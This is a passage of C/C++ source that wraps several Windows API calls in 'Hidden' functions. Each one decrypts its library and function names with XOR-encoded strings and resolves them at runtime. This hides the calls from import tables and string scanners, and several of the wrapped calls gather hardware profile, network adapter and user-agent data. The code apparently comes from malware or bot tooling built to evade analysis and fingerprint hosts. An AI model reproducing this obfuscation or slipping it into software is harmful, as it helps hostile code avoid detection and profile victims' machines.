	return (ATOM)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*RegisterClassA*/XorStr<0xB6, 15, 0xFA40546B>("\xE4\xD2\xDF\xD0\xC9\xCF\xD9\xCF\xFD\xD3\xA1\xB2\xB1\x82" + 0xFA40546B).s, 1, lpWndClass);
}

BOOL IsDialogMessageHidden(_In_ HWND hDlg, _In_ LPMSG lpMsg)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*IsDialogMessageA*/XorStr<0x98, 17, 0x77CE4AAA>("\xD1\xEA\xDE\xF2\xFD\xF1\xF1\xF8\xED\xC4\xD1\xD0\xC5\xC2\xC3\xE6" + 0x77CE4AAA).s, 2, lpMsg, hDlg);
}


BOOL UpdateWindowHidden(_In_ HWND hWnd)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*UpdateWindow*/XorStr<0x5E, 13, 0x26DDCF55>("\x0B\x2F\x04\x00\x16\x06\x33\x0C\x08\x03\x07\x1E" + 0x26DDCF55).s, 1, hWnd);
}

BOOL GetCurrentHwProfileHidden(_Out_ LPHW_PROFILE_INFOA lpHwProfileInfo)
{
	return (BOOL)callWinAPIFunction(/*Advapi32.dll*/XorStr<0x31, 13, 0xCFEFB911>("\x70\x56\x45\x55\x45\x5F\x04\x0A\x17\x5E\x57\x50" + 0xCFEFB911).s,/*GetCurrentHwProfileA*/XorStr<0xEC, 21, 0x0C04639D>("\xAB\x88\x9A\xAC\x85\x83\x80\x96\x9A\x81\xBE\x80\xA8\x8B\x95\x9D\x95\x91\x9B\xBE" + 0x0C04639D).s, 1, lpHwProfileInfo);
}

ULONG GetAdaptersAddressesHidden(_In_ ULONG Family, _In_ ULONG Flags, _Reserved_ PVOID Reserved, _Out_writes_bytes_opt_(*SizePointer) PIP_ADAPTER_ADDRESSES AdapterAddresses, _Inout_ PULONG SizePointer)
{
	return (ULONG)callWinAPIFunction(/*Iphlpapi.dll*/XorStr<0x04, 13, 0xC257DE3A>("\x4D\x75\x6E\x6B\x78\x68\x7A\x62\x22\x69\x62\x63" + 0xC257DE3A).s,/*GetAdaptersAddresses*/XorStr<0x3E, 21, 0xDA470A08>("\x79\x5A\x34\x00\x26\x22\x34\x31\x23\x35\x3B\x08\x2E\x2F\x3E\x28\x3D\x3C\x35\x22" + 0xDA470A08).s, 5, SizePointer, AdapterAddresses, Reserved, Flags, Family);
}

BOOL PathFileExistsHidden(LPCTSTR pszPath)
{
	//return (BOOL)callWinAPIFunction(/*Shlwapi.dll*/XorStr<0xE3, 12, 0x7D9CB714>("\xB0\x8C\x89\x91\x86\x98\x80\xC4\x8F\x80\x81" + 0x7D9CB714).s,/*PathFileExistsA*/XorStr<0xDD, 16, 0xC096132B>("\x8D\xBF\xAB\x88\xA7\x8B\x8F\x81\xA0\x9E\x8E\x9B\x9D\x99\xAA" + 0xC096132B).s, 1, pszPath);
}

HRESULT ObtainUserAgentStringHidden(DWORD dwOption, char* pcszUAOut, DWORD* cbSize)
{
	return (HRESULT)callWinAPIFunction(/*Urlmon.dll*/XorStr<0x7F, 11, 0x0BECEE6B>("\x2A\xF2\xED\xEF\xEC\xEA\xAB\xE2\xEB\xE4" + 0x0BECEE6B).s,/*ObtainUserAgentString*/XorStr<0x56, 22, 0x6966C8D9>("\x19\x35\x2C\x38\x33\x35\x09\x2E\x3B\x2D\x21\x06\x07\x0D\x10\x36\x12\x15\x01\x07\x0D" + 0x6966C8D9).s, 3, cbSize, pcszUAOut, dwOption);
}
